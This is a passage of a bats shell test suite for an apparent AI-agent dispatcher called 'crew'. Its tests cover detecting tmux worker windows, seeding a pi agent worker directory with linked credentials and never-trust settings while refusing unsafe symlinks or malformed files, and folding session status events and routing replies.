    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "occupants: a finished agent that dropped to a shell is still an occupant" {
  stub_tmux "$(printf '@23\tsage\t/wt/a\n')" "$(printf '@23\t%%33\tfish\n')"
  run run_crew occupants /wt/a
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].engine')" = "false" ]
  [ "$(echo "$output" | jq -r '.[0].pane')" = "null" ]
}

@test "occupants: ignores other paths, unnamed windows and the dispatcher" {
  stub_tmux "$(printf '@1\tsage\t/wt/b\n@2\t\t/wt/a\n@3\tdispatcher\t/wt/a\n')" "$(printf '@1\t%%1\tclaude\n@3\t%%3\tclaude\n')"
  run run_crew occupants /wt/a
  [ "$output" = "[]" ]
}

@test "occupants: never reports the caller's own window" {
  stub_tmux "$(printf '@23\tsage\t/wt/a\n')" "$(printf '@23\t%%33\tclaude\n')"
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
case "$1" in
list-windows) cat "$STUB_DIR/wins.txt" ;;
list-panes) cat "$STUB_DIR/panes.txt" ;;
display-message) printf '%s\n' '@23' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  TMUX_PANE=%33 run run_crew occupants /wt/a
  [ "$output" = "[]" ]
}

@test "occupants: needs a path" {
  run run_crew occupants
  [ "$status" -eq 1 ]
  [[ "$output" == *"occupants <worktree-path>"* ]]
}

@test "engine-cmd: claude is a live engine" {
  run run_crew engine-cmd claude
  [ "$status" -eq 0 ]
}

@test "engine-cmd: a nix-wrapped claude pane is a live engine" {
  run run_crew engine-cmd .claude-wrapped
  [ "$status" -eq 0 ]
}

@test "engine-cmd: node (cursor-agent's wrapper) is a live engine" {
  run run_crew engine-cmd node
  [ "$status" -eq 0 ]
}

@test "engine-cmd: codex is a live engine" {
  run run_crew engine-cmd codex
  [ "$status" -eq 0 ]
}

@test "engine-cmd: pi is a live engine" {
  run run_crew engine-cmd pi
  [ "$status" -eq 0 ]
}

@test "engine-cmd: a plain shell is not an engine" {
  run run_crew engine-cmd fish
  [ "$status" -eq 1 ]
}

@test "engine-cmd: needs a command" {
  run run_crew engine-cmd
  [ "$status" -eq 1 ]
  [[ "$output" == *"engine-cmd <pane_current_command>"* ]]
}

# Ambient pi dir with one entry per auth.json case the seeder distinguishes.
_pi_fixture() {
  export HOME="$BATS_TEST_TMPDIR/home"
  unset PI_CODING_AGENT_DIR
  AMBIENT="$HOME/.pi/agent"
  WORKER="$HOME/.pi/dispatcher-worker"
  mkdir -p "$AMBIENT"
  cat >"$AMBIENT/auth.json" <<'EOF'
{
  "opencode": {"type": "api_key", "key": "SECRET-FIXTURE-123"},
  "openrouter": {"type": "api_key", "key": "$OPENROUTER_API_KEY", "env": {"X": "y"}},
  "deepseek": {"type": "api_key", "key": "!echo x"},
  "anthropic": {"type": "oauth", "access": "a", "refresh": "r", "expires": 1},
  "a b": {"type": "api_key", "key": "bad-name"},
  "lit": {"type": "api_key", "key": "sk-a$b"}
}
EOF
  printf '{"defaultProjectTrust":"always"}\n' >"$AMBIENT/settings.json"
  printf '{}\n' >"$AMBIENT/trust.json"
  printf '{"models":[{"id":"deepseek/deepseek-v4.1-flash"}]}\n' >"$AMBIENT/models-store.json"
}

@test "pi-agent-dir: prints only the worker dir and seeds never-trust settings" {
  _pi_fixture
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -eq 0 ]
  [ "${#lines[@]}" -eq 1 ]
  [ "$output" = "$WORKER" ]
  [ -d "$WORKER" ]
  [ "$(stat -c %a "$WORKER")" = 700 ]
  [ "$(jq -r .defaultProjectTrust "$WORKER/settings.json")" = never ]
}

@test "pi-agent-dir: generates models.json from localModels" {
  _pi_fixture
  mkdir -p "$XDG_CONFIG_HOME/dispatcher"
  cat >"$XDG_CONFIG_HOME/dispatcher/settings.json" <<'EOF'
{"localModels": {
  "lemonade/Qwen3.8-Flash-Next-MTP": {"baseUrl": "http://halo.test:13305/v1", "contextWindow": 131072},
  "lemonade/Alpha": {"baseUrl": "http://halo.test:13305/v1", "contextWindow": 4096}
}}
EOF
  run_crew pi-agent-dir >/dev/null
  jq -e '. == {providers: {lemonade: {baseUrl: "http://halo.test:13305/v1", api: "openai-completions", apiKey: "lemonade", models: [{id: "Alpha", contextWindow: 4096}, {id: "Qwen3.8-Flash-Next-MTP", contextWindow: 131072}]}}}' "$WORKER/models.json"
  # dispatcher-owned: dropping the entry must stop it being reachable.
  rm "$XDG_CONFIG_HOME/dispatcher/settings.json"
  run_crew pi-agent-dir >/dev/null
  jq -e '. == {providers: {}}' "$WORKER/models.json"
}

@test "pi-agent-dir: a localModels provider with a stored credential is refused" {
  _pi_fixture
  printf '{"openai":{"type":"api_key","key":"sk-test-fixture"}}\n' >"$AMBIENT/auth.json"
  mkdir -p "$XDG_CONFIG_HOME/dispatcher"
  printf '{"localModels":{"OpenAI/gpt-oss-120b":{"baseUrl":"http://halo.test:13305/v1","contextWindow":4096}}}\n' \
    >"$XDG_CONFIG_HOME/dispatcher/settings.json"
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"localModels provider 'OpenAI' has a stored pi credential"* ]]
  [[ "$stderr" != *sk-test-fixture* ]]
  [ ! -e "$WORKER/models.json" ]
}

@test "pi-agent-dir: invalid dispatcher settings refuse to seed models.json" {
  _pi_fixture
  mkdir -p "$XDG_CONFIG_HOME/dispatcher"
  printf '{"localModels":{"lemonade/Alpha":{"contextWindow":4096}}}\n' >"$XDG_CONFIG_HOME/dispatcher/settings.json"
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"models.json"* ]]
  [ ! -e "$WORKER/models.json" ]
}

@test "pi-agent-dir: auth links to the ambient file, never copies it" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  [ -L "$WORKER/auth.json" ]
  [ "$(readlink "$WORKER/auth.json")" = "$AMBIENT/auth.json" ]
  # A copy is what leaked a secret into the worker dir; a link holds a path.
  run grep -rF SECRET-FIXTURE-123 "$WORKER" --exclude-dir=.
  [ "$status" -eq 1 ]
}

@test "pi-agent-dir: every entry stays reachable through the link, oauth included" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  # The api_key-only filter dropped these, leaving an oauth-only machine with {} (#198).
  [ "$(jq -r .anthropic.type "$WORKER/auth.json")" = oauth ]
  [ "$(jq -r .anthropic.access "$WORKER/auth.json")" = a ]
  [ "$(jq -r .opencode.key "$WORKER/auth.json")" = SECRET-FIXTURE-123 ]
  [ "$(jq -c .openrouter "$WORKER/auth.json")" = '{"type":"api_key","key":"$OPENROUTER_API_KEY","env":{"X":"y"}}' ]
}

@test "pi-agent-dir: a pi-side token refresh writes through to the ambient file" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  # pi rewrites auth.json in place on refresh; through the link that must land
  # in the ambient file, not strand a divergent copy in the shared worker dir.
  jq '.anthropic.access = "refreshed"' "$WORKER/auth.json" >"$WORKER/auth.next"
  cat "$WORKER/auth.next" >"$WORKER/auth.json"
  rm "$WORKER/auth.next"
  [ -L "$WORKER/auth.json" ]
  [ "$(jq -r .anthropic.access "$AMBIENT/auth.json")" = refreshed ]
}

@test "pi-agent-dir: the ambient dir is untouched and trust.json is not seeded" {
  _pi_fixture
  before=$(sha256sum "$AMBIENT"/*)
  mode=$(stat -c %a "$AMBIENT/auth.json")
  run_crew pi-agent-dir >/dev/null
  [ "$(sha256sum "$AMBIENT"/*)" = "$before" ]
  [ "$(stat -c %a "$AMBIENT/auth.json")" = "$mode" ]
  [ ! -e "$WORKER/trust.json" ]
}

@test "pi-agent-dir: the model catalog is copied, not linked" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  # Workers share this dir; a link would aim N concurrent refreshes at the real catalog.
  [ ! -L "$WORKER/models-store.json" ]
  [ "$(jq -r '.models[0].id' "$WORKER/models-store.json")" = deepseek/deepseek-v4.1-flash ]
  [ "$(stat -c %a "$WORKER/models-store.json")" = 644 ]
}

@test "pi-agent-dir: a re-seed refreshes a stale or corrupted catalog copy" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  printf 'torn{\n' >"$WORKER/models-store.json"
  run_crew pi-agent-dir >/dev/null
  [ "$(jq -r '.models[0].id' "$WORKER/models-store.json")" = deepseek/deepseek-v4.1-flash ]
}

@test "pi-agent-dir: no ambient catalog leaves the worker without one" {
  _pi_fixture
  rm "$AMBIENT/models-store.json"
  run_crew pi-agent-dir >/dev/null
  [ ! -e "$WORKER/models-store.json" ]
}

@test "pi-agent-dir: re-seed keeps pi-written settings and forces never" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  printf '{"lastChangelogVersion":"9","defaultProjectTrust":"always"}\n' >"$WORKER/settings.json"
  run_crew pi-agent-dir >/dev/null
  [ "$(jq -r .lastChangelogVersion "$WORKER/settings.json")" = 9 ]
  [ "$(jq -r .defaultProjectTrust "$WORKER/settings.json")" = never ]
}

@test "pi-agent-dir: a no-op re-seed leaves auth in place and no temp files" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  before=$(stat -c '%i %Y' "$WORKER/auth.json" "$WORKER/settings.json")
  run_crew pi-agent-dir >/dev/null
  [ "$(stat -c '%i %Y' "$WORKER/auth.json" "$WORKER/settings.json")" = "$before" ]
  [ -z "$(find "$WORKER" -name '.seed.*')" ]
}

@test "pi-agent-dir: seeds the ambient hookyard bridge and registers it" {
  _pi_fixture
  mkdir -p "$AMBIENT/bin"
  printf '// hookyard bridge\n' >"$AMBIENT/bin/hookyard-bridge.ts"
  run_crew pi-agent-dir >/dev/null
  [ -f "$WORKER/bin/hookyard-bridge.ts" ]
  cmp -s "$AMBIENT/bin/hookyard-bridge.ts" "$WORKER/bin/hookyard-bridge.ts"
  [ "$(jq -r '.extensions[0]' "$WORKER/settings.json")" = "$WORKER/bin/hookyard-bridge.ts" ]
  [ "$(jq -r .defaultProjectTrust "$WORKER/settings.json")" = never ]
}

@test "pi-agent-dir: no ambient hookyard bridge leaves the worker unhooked" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  [ ! -e "$WORKER/bin/hookyard-bridge.ts" ]
  [ "$(jq -c '.extensions // "absent"' "$WORKER/settings.json")" = '"absent"' ]
}

@test "pi-agent-dir: a re-seed appends the bridge once and keeps a pi-written order" {
  _pi_fixture
  mkdir -p "$AMBIENT/bin"
  printf '// hookyard bridge\n' >"$AMBIENT/bin/hookyard-bridge.ts"
  run_crew pi-agent-dir >/dev/null
  # pi (or a user) may prepend its own extension; a reseed must not reorder the
  # list nor duplicate hookyard's entry.
  printf '{"extensions":["/some/other.ts","%s"]}\n' "$WORKER/bin/hookyard-bridge.ts" >"$WORKER/settings.json"
  run_crew pi-agent-dir >/dev/null
  [ "$(jq -c .extensions "$WORKER/settings.json")" = "[\"/some/other.ts\",\"$WORKER/bin/hookyard-bridge.ts\"]" ]
  [ -z "$(find "$WORKER" -name '.seed.*')" ]
}

@test "pi-agent-dir: a non-array extensions value is refused, not a jq crash" {
  _pi_fixture
  mkdir -p "$AMBIENT/bin"
  printf '// hookyard bridge\n' >"$AMBIENT/bin/hookyard-bridge.ts"
  run_crew pi-agent-dir >/dev/null
  # A hand-edited/future-schema settings.json must refuse legibly, not die on an
  # opaque jq `cannot be added` and take dispatch/dispatch-resume down with it.
  # `false` is included: jq's `//` would fold it into null and slip the guard.
  for bad in '{"not":"an array"}' 'false' '"a string"' '3'; do
    printf '{"extensions":%s}\n' "$bad" >"$WORKER/settings.json"
    run --separate-stderr run_crew pi-agent-dir
    [ "$status" -ne 0 ]
    [ -z "$output" ]
    [[ "$stderr" == *"non-array extensions value"* ]]
    [ "$(jq -c .extensions "$WORKER/settings.json")" = "$bad" ]
  done
}

@test "pi-agent-dir: no ambient auth.json seeds an empty auth" {
  _pi_fixture
  rm "$AMBIENT/auth.json"
  run_crew pi-agent-dir >/dev/null
  [ "$(jq -c . "$WORKER/auth.json")" = '{}' ]
}

# Seed once, break the ambient auth.json with $1, and expect a refusal. The
# worker file is a link, so "kept" is about the link, not its content.
_pi_broken_auth() {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  printf '%s\n' "$1" >"$AMBIENT/auth.json"
}

_pi_assert_link_kept() {
  [ -L "$WORKER/auth.json" ]
  [ "$(readlink "$WORKER/auth.json")" = "$AMBIENT/auth.json" ]
}

@test "pi-agent-dir: a malformed ambient auth.json is refused, worker link kept" {
  _pi_broken_auth '{"opencode":{"ty'
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"$AMBIENT/auth.json is unreadable or not a JSON object"* ]]
  _pi_assert_link_kept
}

@test "pi-agent-dir: a non-object ambient auth.json is refused" {
  _pi_broken_auth '[]'
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [[ "$stderr" == *"not a JSON object"* ]]
  _pi_assert_link_kept
}

@test "pi-agent-dir: an unreadable ambient auth.json is refused" {
  [ "$(id -u)" -eq 0 ] && skip "root reads mode 000 files"
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  chmod 000 "$AMBIENT/auth.json"
  run --separate-stderr run_crew pi-agent-dir
  chmod 600 "$AMBIENT/auth.json"
  [ "$status" -ne 0 ]
  [[ "$stderr" == *"unreadable or not a JSON object"* ]]
  _pi_assert_link_kept
}

@test "pi-agent-dir: a worker dir symlinked to the ambient dir is refused" {
  _pi_fixture
  ln -s "$AMBIENT" "$WORKER"
  before=$(sha256sum "$AMBIENT/auth.json" "$AMBIENT/settings.json")
  mode=$(stat -c %a "$AMBIENT")
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"symlink or not a directory"* ]]
  [ "$(sha256sum "$AMBIENT/auth.json" "$AMBIENT/settings.json")" = "$before" ]
  [ "$(stat -c %a "$AMBIENT")" = "$mode" ]
}

@test "pi-agent-dir: a worker dir that is a regular file is refused" {
  _pi_fixture
  printf 'x\n' >"$WORKER"
  run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [ "$(cat "$WORKER")" = x ]
}

@test "pi-agent-dir: a PI_CODING_AGENT_DIR aliasing the worker dir is refused" {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  ln -s "$WORKER" "$HOME/alias"
  before=$(sha256sum "$WORKER/auth.json")
  PI_CODING_AGENT_DIR="$HOME/alias" run --separate-stderr run_crew pi-agent-dir
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"refusing to seed pi worker dir"* ]]
  [ "$(sha256sum "$WORKER/auth.json")" = "$before" ]
}

@test "pi-agent-dir: a relative PI_CODING_AGENT_DIR falls back to ~/.pi/agent" {
  _pi_fixture
  mkdir -p rel
  printf '{"opencode":{"type":"api_key","key":"!echo rel"}}\n' >rel/auth.json
  PI_CODING_AGENT_DIR=rel run_crew pi-agent-dir >/dev/null
  [ "$(readlink "$WORKER/auth.json")" = "$AMBIENT/auth.json" ]
}

# Seed once, then drop the ambient auth.json so the test can put a non-regular
# entry (or nothing reachable) in its place.
_pi_seeded() {
  _pi_fixture
  run_crew pi-agent-dir >/dev/null
  rm "$AMBIENT/auth.json"
}

# The timeout turns a seeder blocked on open() into a failure instead of a hung suite.
_pi_run_seed() {
  run --separate-stderr timeout 10 bash -euo pipefail "$CREW" pi-agent-dir
}

_pi_assert_refused() {
  [ "$status" -ne 0 ]
  [ "$status" -ne 124 ]
  [ -z "$output" ]
  [[ "$stderr" == *"refusing to seed pi credentials"* ]]
  _pi_assert_link_kept
}

@test "pi-agent-dir: a dangling ambient auth.json symlink is refused, worker auth kept" {
  _pi_seeded
  ln -s "$HOME/unmounted/auth.json" "$AMBIENT/auth.json"
  _pi_run_seed
  _pi_assert_refused
}

@test "pi-agent-dir: a looping ambient auth.json symlink is refused" {
  _pi_seeded
  ln -s auth.json "$AMBIENT/auth.json"
  _pi_run_seed
  _pi_assert_refused
}

@test "pi-agent-dir: an ambient auth.json symlinked to a directory is refused" {
  _pi_seeded
  mkdir "$AMBIENT/d"
  ln -s d "$AMBIENT/auth.json"
  _pi_run_seed
  _pi_assert_refused
}

@test "pi-agent-dir: a FIFO ambient auth.json is refused without blocking" {
  _pi_seeded
  mkfifo "$AMBIENT/auth.json"
  _pi_run_seed
  _pi_assert_refused
}

@test "pi-agent-dir: an ambient auth.json behind an unsearchable dir is refused" {
  [ "$(id -u)" -eq 0 ] && skip "root searches mode 000 dirs"
  _pi_seeded
  mkdir "$HOME/locked"
  printf '{}\n' >"$HOME/locked/auth.json"
  ln -s "$HOME/locked/auth.json" "$AMBIENT/auth.json"
  chmod 000 "$HOME/locked"
  _pi_run_seed
  # Before any assertion, so a failure cannot leave a dir teardown's rm -rf trips on.
  chmod 700 "$HOME/locked"
  _pi_assert_refused
}

@test "pi-agent-dir: a dangling ambient dir symlink is refused" {
  _pi_seeded
  rm -r "$AMBIENT"
  ln -s "$HOME/unmounted" "$AMBIENT"
  _pi_run_seed
  _pi_assert_refused
}

# "weird" is a real searchable dir; "weird\n" is a dangling symlink one level
# up in the real (uncorrupted) ancestor walk — see crew.sh's dirname comment.
@test "pi-agent-dir: an ambient path component ending in a newline is refused, not stripped" {
  _pi_seeded
  mkdir -p "$HOME/.pi/weird"
  ln -s "$HOME/unmounted" "$HOME/.pi/weird"$'\n'
  export PI_CODING_AGENT_DIR="$HOME/.pi/weird"$'\n'"/agent"
  _pi_run_seed
  _pi_assert_refused
}

@test "pi-agent-dir: a missing ambient dir seeds an empty auth" {
  _pi_fixture
  rm -r "$AMBIENT"
  run_crew pi-agent-dir >/dev/null
  [ "$(jq -c . "$WORKER/auth.json")" = '{}' ]
}

@test "pi-agent-dir: a relative ambient auth.json symlink still resolves" {
  _pi_fixture
  mkdir -p "$HOME/.pi/secrets"
  mv "$AMBIENT/auth.json" "$HOME/.pi/secrets/auth.json"
  ln -s ../secrets/auth.json "$AMBIENT/auth.json"
  run_crew pi-agent-dir >/dev/null
  # The worker link is absolute, so the ambient link's relative target resolves
  # against the ambient dir — not the worker dir and not pi's cwd.
  [ "$(readlink "$WORKER/auth.json")" = "$AMBIENT/auth.json" ]
  [ "$(cd / && jq -r .opencode.key "$WORKER/auth.json")" = SECRET-FIXTURE-123 ]
}

@test "sessions: folds each session separately, oldest first" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run_crew status "worker:feat/x#s2-2" working
  run run_crew sessions feat/x
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r 'length')" = "2" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s1-1" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "done" ]
  [ "$(echo "$output" | jq -r '.[0].terminal')" = "true" ]
  [ "$(echo "$output" | jq -r '.[1].session')" = "s2-2" ]
  [ "$(echo "$output" | jq -r '.[1].state')" = "working" ]
  [ "$(echo "$output" | jq -r '.[1].terminal')" = "false" ]
  [ "$(echo "$output" | jq -r '.[1].worker_id')" = "worker:feat/x#s2-2" ]
}

@test "sessions: pr_open is not terminal" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r '.[0].terminal')" = "false" ]
}

@test "sessions: a branch with a '#' in its name folds on the last '#'" {
  CREW_ID=c1 run_crew status "worker:feat/a#b#s1-1" working
  run run_crew sessions 'feat/a#b'
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s1-1" ]
}

@test "sessions: legacy branch-keyed events fold in as a null session" {
  CREW_ID=c1 run_crew status "worker:feat/x" done
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r '.[0].session')" = "null" ]
  [ "$(echo "$output" | jq -r '.[0].worker_id')" = "worker:feat/x" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "done" ]
}

@test "sessions: a dispatched session with no status yet has a null state" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:(now*1000|floor), crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s9-9"}' >>"$log"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s9-9" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "null" ]
  [ "$(echo "$output" | jq -r '.[0].terminal')" = "false" ]
}

@test "sessions: a watchdog's session-less row folds into the live session" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" working "" "" "$t"
  seed_raw worker:feat/x blocked "prompt: interactive prompt in pane %9" watchdog "$((t + 1000))"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s1-1" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "blocked" ]
  [ "$(echo "$output" | jq -r '.[0].worker_id')" = "worker:feat/x#s1-1" ]
}

@test "sessions: a session-less heartbeat after a newer dispatch folds into that session" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" done "" "" "$t"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  jq -nc --argjson ts "$((t + 1000))" '{ts:$ts, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s2-2"}' >>"$log"
  seed_raw worker:feat/x working "" "" "$((t + 2000))"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "2" ]
  [ "$(echo "$output" | jq -r 'last.session')" = "s2-2" ]
  [ "$(echo "$output" | jq -r 'last.state')" = "working" ]
}

@test "sessions: a session-less row on a '#' branch keys on the full branch" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/a#b#s1-1" working "" "" "$t"
  seed_raw "worker:feat/a#b" blocked "" watchdog "$((t + 1000))"
  run run_crew sessions 'feat/a#b'
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s1-1" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "blocked" ]
}

@test "sessions: a session-less row after a terminal session does not revive it" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" done "" "" "$t"
  seed_raw worker:feat/x working "" "" "$((t + 1000))"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "2" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s1-1" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "done" ]
  [ "$(echo "$output" | jq -r 'last.session')" = "null" ]
}

@test "sessions: a session-less row in the same millisecond as a terminal session does not revive it" {
  t=$(($(date +%s) * 1000))
  seed_raw "worker:feat/x#s1-1" done "" "" "$t"
  seed_raw worker:feat/x working "" "" "$t"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "2" ]
  [ "$(echo "$output" | jq -r '.[] | select(.session == "s1-1") | .state')" = "done" ]
  [ "$(echo "$output" | jq -r '[.[] | select(.session == "s1-1" and .terminal)] | length')" = "1" ]
  [ "$(echo "$output" | jq -r '[.[] | select(.session != null and .state == "working")] | length')" = "0" ]
}

@test "sessions: a resume row starts its session" {
  t=$(($(date +%s) * 1000))
  seed_start dispatch s1-1 "$t"
  seed_raw "worker:feat/x#s1-1" working "" "" "$((t + 1000))"
  seed_start resume s2-2 "$((t + 2000))"
  seed_raw worker:feat/x blocked "" "" "$((t + 3000))"
  run run_crew sessions feat/x
  [ "$(echo "$output" | jq -r 'length')" = "2" ]
  [ "$(echo "$output" | jq -r '.[0].state')" = "working" ]
  [ "$(echo "$output" | jq -r 'last.session')" = "s2-2" ]
  [ "$(echo "$output" | jq -r 'last.state')" = "blocked" ]
}

@test "sessions: --crew scopes the fold" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c2 run_crew status "worker:feat/x#s2-2" working
  run run_crew sessions feat/x --crew c2
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "s2-2" ]
}

@test "sessions: an unknown branch is an empty array" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  run run_crew sessions feat/nope
  [ "$output" = "[]" ]
}

@test "sessions: needs a branch" {
  run run_crew sessions
  [ "$status" -eq 1 ]
  [[ "$output" == *"sessions <branch>"* ]]
}

@test "reply: a branch-only worker target resolves to the newest live session" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run_crew status "worker:feat/x#s2-2" working
  CREW_ID=c1 run_crew reply "worker:feat/x" "go"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ "$output" = "worker:feat/x#s2-2" ]
}

@test "reply: refuses when the newest session is terminal" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run run_crew reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"re-dispatch"* ]]
}

@test "reply: CREW_ID unset resolves the single crew with a live session (#302)" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 0 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | "\(.crew_id) \(.to)"' "$log"
  [ "$output" = "c1 worker:feat/x#s1-1" ]
}

@test "reply: --crew works with CREW_ID unset (#302)" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c2 run_crew status "worker:feat/x#s2-2" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go" --crew c2
  [ "$status" -eq 0 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | .to' "$log"
  [ "$output" = "worker:feat/x#s2-2" ]
}

@test "reply: CREW_ID unset with live sessions in two crews refuses naming both (#302)" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c2 run_crew status "worker:feat/x#s2-2" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"c1"* && "$output" == *"c2"* && "$output" == *"--crew"* ]]
}

@test "reply: CREW_ID unset with only a terminal session names the unset crew (#302)" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"CREW_ID not set"* ]]
}

@test "reply: CREW_ID unset ignores a crashed session in an old crew (#327)" {
  # old crew: a registered dead pid with a non-terminal session that only
  # lingers because the crew crashed before posting a terminal status.
  (exit 0) & dead_pid=$!
  wait "$dead_pid" 2>/dev/null || true
  CREW_ID=c-old run_crew register "$dead_pid"
  CREW_ID=c-old run_crew status "worker:feat/x#s1-1" working
  # current crew: a live registered pid and a newer live session on the branch.
  CREW_ID=c-cur run_crew register "$$"
  CREW_ID=c-cur run_crew status "worker:feat/x#s2-2" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 0 ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | "\(.crew_id) \(.to)"' "$log"
  [ "$output" = "c-cur worker:feat/x#s2-2" ]
}

@test "reply: CREW_ID unset still refuses two genuinely live crews (#327)" {
  sleep 30 & live_a=$!
  sleep 30 & live_b=$!
  CREW_ID=c1 run_crew register "$live_a"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c2 run_crew register "$live_b"
  CREW_ID=c2 run_crew status "worker:feat/x#s2-2" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"c1"* && "$output" == *"c2"* && "$output" == *"--crew"* ]]
  kill "$live_a" "$live_b" 2>/dev/null || true
  wait "$live_a" "$live_b" 2>/dev/null || true
}

@test "reply: CREW_ID unset with only crashed crews still refuses naming both (#327)" {
  # Every candidate's crew is dead: with no live crew to prefer, the fail-safe
  # is to keep both and refuse, never to guess one.
  (exit 0) & dead_a=$!
  wait "$dead_a" 2>/dev/null || true
  (exit 0) & dead_b=$!
  wait "$dead_b" 2>/dev/null || true
  CREW_ID=c1 run_crew register "$dead_a"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c2 run_crew register "$dead_b"
  CREW_ID=c2 run_crew status "worker:feat/x#s2-2" working
  run env -u CREW_ID bash -euo pipefail "$CREW" reply "worker:feat/x" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"c1"* && "$output" == *"c2"* && "$output" == *"--crew"* ]]
}

@test "reply: refuses a branch with no sessions" {
  CREW_ID=c1 run run_crew reply "worker:feat/nope" "go"
  [ "$status" -eq 1 ]
  [[ "$output" == *"no session"* ]]
}

@test "reply: an explicit session id is honoured verbatim" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  CREW_ID=c1 run_crew reply "worker:feat/x#s1-1" "go"
